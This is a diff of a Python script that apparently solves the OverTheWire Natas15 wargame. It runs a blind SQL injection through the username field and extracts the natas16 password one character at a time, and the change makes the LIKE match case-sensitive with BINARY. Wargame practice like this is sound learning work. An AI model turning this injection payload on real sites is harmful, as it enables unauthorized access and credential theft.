@@ -8,7 +8,7 @@ characters = ascii_letters + digits
 password = ''
 while len(password) < 32:
     for char in characters:
-        payload = {'username': f'natas16" AND password LIKE "{password + char}%"#'}
+        payload = {'username': f'natas16" AND password LIKE BINARY "{password + char}%"#'}
         r = requests.post(URL, data=payload)
         if 'This user exists.' in r.text:
             password += char
